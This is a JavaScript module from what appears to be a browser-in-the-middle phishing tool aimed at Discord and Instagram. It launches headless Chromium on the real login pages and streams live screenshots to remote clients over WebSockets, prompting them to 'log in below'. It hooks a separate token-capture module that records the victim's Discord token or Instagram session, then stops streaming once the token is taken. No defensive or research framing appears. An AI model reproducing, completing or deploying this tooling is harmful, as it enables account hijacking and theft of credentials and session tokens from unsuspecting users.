// ── browser-manager.js ───────────────────────────────────
// Browser lifecycle, state, screenshots, and WS messaging.

const fs   = require('fs');
const path = require('path');
const { chromium } = require('playwright');

// ── Config ───────────────────────────────────────────────
const CONFIG_PATH = path.join(__dirname, 'config.json');
let CFG = { discord: { email: '', password: '' }, instagram: { username: '', password: '' } };
try {
    const raw = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
    CFG.discord.email      = raw.discord?.email      || '';
    CFG.discord.password   = raw.discord?.password   || '';
    CFG.instagram.username = raw.instagram?.username || '';
    CFG.instagram.password = raw.instagram?.password || '';
} catch (_) {}

// ── Constants ─────────────────────────────────────────────
const BROWSER_WIDTH        = 1280;
const BROWSER_HEIGHT       = 720;
const SCREENSHOT_INTERVAL_MS = 100;
const SCREENSHOT_QUALITY   = 70;
const MAX_CLIENTS          = 3;
const MAX_TABS             = 5;
const DEFAULT_TIMEOUT_S    = 60;
const CHROME_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';

const URLS = {
    discord:   'https://discord.com/login',
    instagram: 'https://www.instagram.com/accounts/login/'
};

const LAUNCH_ARGS = [
    '--disable-gpu', '--no-sandbox', '--disable-dev-shm-usage',
    '--disable-background-networking', '--disable-sync',
    '--no-first-run', '--disable-extensions'
];

// ── Per-service state ─────────────────────────────────────
const SVC = {
    discord: {
        browser: null, context: null, pages: [], activeTabIndex: 0,
        screenshotInterval: null, tokenCaptured: false, capturedToken: null,
        clients: new Set(), lastActivity: Date.now(),
        timeoutTimer: null, timeoutSeconds: DEFAULT_TIMEOUT_S
    },
    instagram: {
        browser: null, context: null, pages: [], activeTabIndex: 0,
        screenshotInterval: null, tokenCaptured: false, capturedSession: null,
        clients: new Set(), lastActivity: Date.now(),
        timeoutTimer: null, timeoutSeconds: DEFAULT_TIMEOUT_S
    }
};

// ── Helpers ───────────────────────────────────────────────
function getActivePage(svc) {
    if (!svc.pages.length) return null;
    const idx = Math.min(svc.activeTabIndex, svc.pages.length - 1);
    return svc.pages[idx]?.page || null;
}

function getTabList(svc) {
    return svc.pages.map((t, i) => ({
        id: t.id, index: i, title: t.title || 'New Tab', active: i === svc.activeTabIndex
    }));
}

function send(ws, data) {
    if (ws.readyState === ws.OPEN) {
        try { ws.send(JSON.stringify(data)); } catch (_) {}
    }
}

function broadcast(svc, data) {
    const json = JSON.stringify(data);
    for (const ws of svc.clients) {
        if (ws.readyState === ws.OPEN) {
            try { ws.send(json); } catch (_) {}
        }
    }
}

// ── Activity & timeout ────────────────────────────────────
function touchActivity(svc, svcName) {
    svc.lastActivity = Date.now();
    resetTimeoutTimer(svc, svcName);
}

function resetTimeoutTimer(svc, svcName) {
    if (svc.timeoutTimer) clearTimeout(svc.timeoutTimer);
    if (svc.timeoutSeconds <= 0 || svc.tokenCaptured) return;
    svc.timeoutTimer = setTimeout(() => {
        if (svc.clients.size === 0) return;
        const idleSec = Math.floor((Date.now() - svc.lastActivity) / 1000);
        if (idleSec >= svc.timeoutSeconds) {
            console.log(`[${svcName}] Idle timeout (${idleSec}s) — disconnecting clients`);
            broadcast(svc, { type: 'timeout', message: `Disconnected after ${svc.timeoutSeconds}s of inactivity` });
            for (const ws of svc.clients) ws.close(1000, 'Idle timeout');
        }
    }, svc.timeoutSeconds * 1000);
}

// ── Screenshots ───────────────────────────────────────────
function startScreenshots(svc, svcName) {
    if (svc.screenshotInterval) return;
    svc.screenshotInterval = setInterval(async () => {
        if (!svc.pages.length || svc.clients.size === 0 || svc.tokenCaptured) return;
        const page = getActivePage(svc);
        if (!page) return;
        try {
            const title = await page.title().catch(() => '');
            if (title && svc.pages[svc.activeTabIndex]) svc.pages[svc.activeTabIndex].title = title;
            const buf = await page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY });
            broadcast(svc, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT, tabIndex: svc.activeTabIndex });
        } catch (_) {}
    }, SCREENSHOT_INTERVAL_MS);
}

function stopScreenshots(svc) {
    if (svc.screenshotInterval) { clearInterval(svc.screenshotInterval); svc.screenshotInterval = null; }
}

// ── Browser lifecycle ─────────────────────────────────────
async function launchBrowser(svcName) {
    const { setupDiscordCapture, setupInstagramCapture } = require('./token-capture');
    const svc = SVC[svcName];
    console.log(`[${svcName}] Launching Chromium...`);

    svc.browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
    svc.context = await svc.browser.newContext({
        viewport: { width: BROWSER_WIDTH, height: BROWSER_HEIGHT },
        userAgent: CHROME_UA
    });
    const page = await svc.context.newPage();
    const tabId = 'tab-' + Date.now();
    svc.pages = [{ page, id: tabId, title: svcName }];
    svc.activeTabIndex = 0;

    if (svcName === 'discord') setupDiscordCapture(svc, 0);
    else setupInstagramCapture(svc, 0);

    console.log(`[${svcName}] Navigating to ${URLS[svcName]}...`);
    await page.goto(URLS[svcName], { waitUntil: 'domcontentloaded' });

    if (svcName === 'discord' && CFG.discord.email && CFG.discord.password) {
        console.log('[discord] Auto-filling credentials...');
        try {
            await page.fill('input[name="email"]', CFG.discord.email);
            await page.fill('input[name="password"]', CFG.discord.password);
            await page.click('button[type="submit"]');
        } catch (_) { console.log('[discord] Auto-fill failed — waiting for manual login'); }
    } else if (svcName === 'instagram' && CFG.instagram.username && CFG.instagram.password) {
        console.log('[instagram] Auto-filling credentials...');
        try {
            await page.fill('input[name="username"]', CFG.instagram.username);
            await page.fill('input[name="password"]', CFG.instagram.password);
            await page.click('button[type="submit"]');
        } catch (_) { console.log('[instagram] Auto-fill failed — waiting for manual login'); }
    }

    broadcast(svc, { type: 'status', text: 'Browser ready — log in below' });
    broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
    startScreenshots(svc, svcName);
    console.log(`[${svcName}] Ready.`);
}

async function closeBrowser(svc, svcName) {
    stopScreenshots(svc);
    if (svc.timeoutTimer) { clearTimeout(svc.timeoutTimer); svc.timeoutTimer = null; }
    if (svc.browser) {
        try { await svc.browser.close(); } catch (_) {}
        svc.browser = null;
        svc.context = null;
        svc.pages = [];
        svc.activeTabIndex = 0;
    }
    console.log(`[${svcName}] Browser closed.`);
}

module.exports = {
    SVC, CFG, CHROME_UA, URLS, LAUNCH_ARGS,
    BROWSER_WIDTH, BROWSER_HEIGHT, SCREENSHOT_QUALITY, MAX_CLIENTS, MAX_TABS, DEFAULT_TIMEOUT_S,
    getActivePage, getTabList, send, broadcast,
    touchActivity, resetTimeoutTimer,
    startScreenshots, stopScreenshots,
    launchBrowser, closeBrowser
};
